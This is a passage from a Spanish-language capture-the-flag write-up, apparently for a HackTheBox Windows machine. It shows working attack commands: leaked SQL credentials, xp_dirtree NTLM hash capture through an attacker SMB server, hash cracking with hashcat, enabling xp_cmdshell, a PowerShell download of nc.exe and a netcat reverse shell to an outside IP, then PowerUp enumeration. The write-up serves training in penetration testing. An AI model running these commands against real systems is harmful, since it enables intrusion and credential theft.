&lt;span class=&#34;k&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;New&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ADODB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConnectionString&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConnectionTimeout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Open&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;If&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;State&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;adStateOpen&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Then&lt;/span&gt;

  &lt;span class=&#34;c&#34;&gt;&amp;#39; MsgBox &amp;#34;connection successful&amp;#34;
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt; 
  &lt;span class=&#34;c&#34;&gt;&amp;#39;Set rs = conn.Execute(&amp;#34;SELECT * @@version;&amp;#34;)
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SELECT * FROM volume;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;Sheets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;A1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CopyFromRecordset&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Close&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;If&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Sub&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;microsoft-sql-server&#34;&gt;MICROSOFT SQL SERVER&lt;/h2&gt;
&lt;p&gt;Ya que tenemos credenciales para la base de datos procedemos a utilizar &lt;code&gt;mssqlclient.py&lt;/code&gt; el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por &amp;ldquo;default&amp;rdquo; en Microsoft SQL Server.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://facility9.com/2009/10/an-introduction-to-sql-server-system-databases/&#34;&gt;&lt;strong&gt;SQL Server Database&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python mssqlclient.py -p &lt;span class=&#34;m&#34;&gt;1433&lt;/span&gt; -windows-auth -debug reporting:&lt;span class=&#34;s1&#34;&gt;&amp;#39;PcwTWTHRwryjc$c6&amp;#39;&lt;/span&gt;@10.10.10.125

SQL&amp;gt; SELECT name FROM master.dbo.sysdatabases
name                                                                                                                              
--------------------------------------------------------------------------------------------------------------------------------  
master                                                                                                                            
tempdb                                                                                                                            
model                                                                                                                             
msdb                                                                                                                              
volume
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;mssql-boo&#34;&gt;MSSQL BOO&lt;/h2&gt;
&lt;p&gt;Enumerando las diferentes bases de datos no encontramos ningun tipo de usuario y contraseña que nos pudiesen ayudar para conectarnos con otro usuario, asi mismo la ejecucion de comandos no esta permitida para nuestro usuario &lt;code&gt;reporting&lt;/code&gt;. Pero el usuario si esta permitido para ejecutar &lt;code&gt;xp_fileexist&lt;/code&gt; y &lt;code&gt;xp_dirtree&lt;/code&gt;, por lo que aprovechando estos podemos hacer Out-of-Band. Se utilizo smbserver.py de forma local para crear un &lt;code&gt;servidor samba&lt;/code&gt; y con mssqlclient.py se ejecuto el comando para hacer una &amp;lsquo;consulta&amp;rsquo; hacia nuestra maquina y asi obtener las contraseñas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; master..xp_fileexist &lt;span class=&#34;s1&#34;&gt;&amp;#39;\10.10.12.75\pwn&amp;#39;&lt;/span&gt; -- -
&lt;span class=&#34;nb&#34;&gt;declare&lt;/span&gt; @q varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;99&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; @q&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.14.23\test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; master.dbo.xp_dirtree @q HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;local&#34;&gt;LOCAL&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python smbserver.py -smb2support -port &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt; -ip 10.10.12.220 Me /tmp/me
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;remote&#34;&gt;REMOTE&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;EXEC MASTER.sys.xp_dirtree &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.12.220\Me&amp;#39;&lt;/span&gt;, 1, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478&#34;&gt;&lt;strong&gt;CAPTURE MSSQL CREDENTIALS WITH SMBSERVER&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_230209.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashcat&#34;&gt;Hashcat&lt;/h4&gt;
&lt;p&gt;Utilizamos hashcat para desencriptar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;5600&lt;/span&gt; -o querier.txt ntlm.txt ../rockyou.txt

mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;decrypted&#34;&gt;DECRYPTED&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---flag&#34;&gt;USER - FLAG&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python mssqlclient.py -p &lt;span class=&#34;m&#34;&gt;1433&lt;/span&gt; -windows-auth -debug MSSQL-SVC:&lt;span class=&#34;s1&#34;&gt;&amp;#39;corporate568&amp;#39;&lt;/span&gt;@10.10.10.125
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que obtuvimos usuario y contraseña de podemos utilizarlos y activar &lt;code&gt;xp_cmdshell&lt;/code&gt; para ejecutar comando dentro de la computadora.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reconfigure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reconfigure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutando comandos, leyendo el flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;EXEC master.dbo.xp_cmdshell &lt;span class=&#34;s1&#34;&gt;&amp;#39;more C:\Users\mssql-svc\Desktop\user.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
output                                                                                                                                                                                                                                                           
--------------------------------------
c37b41bb669da345bb14de50faab3c16
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell-inversa---netcat&#34;&gt;SHELL INVERSA - NETCAT&lt;/h2&gt;
&lt;p&gt;Utilizando powershell para descargar &lt;code&gt;nc.exe&lt;/code&gt; (netcat) en la computadora.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;powershell -command &amp;#34;&amp;amp; { iwr 10.10.12.33/nc.exe -OutFile C:\Users\mssql-svc\Desktop\nc.exe }&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando nc.exe (netcat) para conectarnos de forma inversa a nuestro puerto local&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\Users\mssql-svc\Desktop\nc.exe -e cmd 10.10.12.33 7878&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;local-1&#34;&gt;Local&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -lvp &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Estando dentro de la maquina como &lt;code&gt;MSSQL-SVC&lt;/code&gt; procedemos a hacer una enumeracion con &lt;code&gt;PowerUp&lt;/code&gt; el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.&lt;/p&gt;
&lt;h3 id=&#34;powerup&#34;&gt;PowerUp&lt;/h3&gt;
&lt;p&gt;Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc&#34;&gt;&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp; { iwr 10.10.12.33/power.ps1 -OutFile C:\Users\mssql-svc\Desktop\power.ps1 }&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;power&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-AllChecks&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-File&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Encoding&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ASCII&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;checks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;


&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Running&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-AllChecks&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;group &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;administrative&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;privileges&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
